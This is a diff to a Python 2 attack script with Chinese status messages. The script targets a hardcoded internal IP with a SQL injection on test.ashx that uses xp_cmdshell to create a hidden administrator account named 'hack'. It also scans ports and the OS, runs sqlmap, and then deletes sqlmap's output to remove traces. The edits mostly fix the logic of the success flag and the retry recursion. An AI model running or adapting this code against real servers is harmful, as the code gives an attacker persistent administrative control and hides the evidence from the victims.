@@ -177,7 +177,8 @@ def cool_show():
 
 def attack(ipaddr,i):
     if(i==0):
-        is_attack=0
+        global is_attack
+        is_attack=1
         return
     url_host="http://"+ipaddr+"/test.ashx?id=1"
     raw_data=" ;exec ..xp_cmdshell 'net user hack Admin123 /add && net localgroup administrators hack /add'"
@@ -196,28 +197,28 @@ def attack(ipaddr,i):
         print "攻击失败,尝试重新攻击"
         print '\033[0m'
         time.sleep(2)
-        i=i-1
-        attack(ipaddr,i)
+        attack(ipaddr,i-1)
 
 def res_out():
     print "" + Fore.RED + Style.BRIGHT+Back.BLACK+"服务器被成功攻陷"
     print "" + Fore.RED + Style.BRIGHT + Back.BLACK + "服务器被成功攻陷"
 if __name__ == '__main__':
-    is_attack=0
     #ipaddr=sys.argv[1]
+    global is_attack
+    is_attack=0
     ipaddr="10.21.140.75"
-
     first_output()
     is_safe(ipaddr)
     scan_port_os(ipaddr)
     attack(ipaddr,5)
     del_file(ipaddr)
     time.sleep(3)
-    if(is_attack==1):
+    if(is_attack==0):
         os.system('sh ~/sqlmap')
         os.system('rm -rf ~/.sqlmap/output')
         res_out()
+        end_succes()
+    else:
         end_fail()
-    end_succes()
     print "" + Fore.RESET + Style.RESET_ALL
     print "\033[0m "
